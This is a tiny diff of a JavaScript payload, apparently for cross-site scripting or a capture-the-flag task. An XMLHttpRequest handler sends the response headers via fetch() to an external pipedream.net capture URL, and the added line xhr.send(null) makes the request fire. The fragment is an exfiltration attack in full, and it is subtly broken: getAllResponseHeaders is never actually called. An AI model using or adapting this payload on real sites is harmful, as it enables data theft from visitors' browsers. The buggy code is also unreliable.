@@ -5,3 +5,4 @@ xhr.onreadystatechange = function() {
     console.log(xhr.getAllResponseHeaders);
     fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders);
 };
+xhr.send(null);
